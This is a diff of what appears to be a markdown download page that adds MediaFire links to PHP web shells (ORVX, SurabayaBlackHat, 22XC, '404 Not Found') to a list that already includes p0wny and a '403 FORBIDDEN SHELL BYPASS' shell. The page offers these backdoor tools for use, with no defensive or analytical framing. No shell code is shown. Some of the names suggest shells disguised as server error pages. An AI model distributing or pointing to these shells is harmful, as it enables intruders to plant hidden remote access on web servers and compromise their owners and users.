@@ -170,6 +170,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/4i2rjy3nsxp8v2q/0x.php/file">0x</a>
 <img src="https://i.imgur.com/2HxELsr.png" alt="beruangsalju profile">
 	
+# <a href="https://www.mediafire.com/file/hqrs7b4d82jhv2l/orvx.php/file">ORVX</a>
+<img src="https://i.imgur.com/uQUmoFD.png" alt="beruangsalju profile">
+	
 # <a href="https://www.mediafire.com/file/slpg9cm69b0gwgj/pwn_shell.php/file">p0wny</a>
 <img src="https://imgur.com/QHro0dL.png" alt="beruangsalju profile">
   
@@ -199,6 +202,9 @@ Date : 10 January 2023
 
 # <a href="https://www.mediafire.com/file/3ak2plgf4k07jxn/shortcut.php/file"> shor7cut </a>
 <img src="https://i.imgur.com/Ncha9AF.png" alt="beruangsalju profile">
+	
+# <a href="https://www.mediafire.com/file/gcj6b1riq4det1s/sbh.php/file"> SurabayaBlackHat </a>
+<img src="https://i.imgur.com/0iQLj65.png" alt="beruangsalju profile">
 	
 # <a href="https://www.mediafire.com/file/viizjs2wqsu880h/troll_shell.php/file">TR0LL1N9</a> 
 <img src="https://imgur.com/kBCu1zl.png" alt="beruangsalju profile">
@@ -274,3 +280,9 @@ Date : 10 January 2023
 	
 # <a href="https://www.mediafire.com/file/uc6b2sx6zw3ciar/403.php/file">403 FORBIDDEN SHELL BYPASS</a> 
 <img src="https://i.imgur.com/nsKzWeb.jpg" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/4554xoo3fu2d4ln/22xc.php/file">22XC</a> 
+<img src="https://i.imgur.com/8gnFZcl.png" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/fgyxmowuqbw92vr/404.php/file">404 Not Found</a> 
+<img src="https://i.imgur.com/OvTi0mL.png" alt="beruangsalju profile">
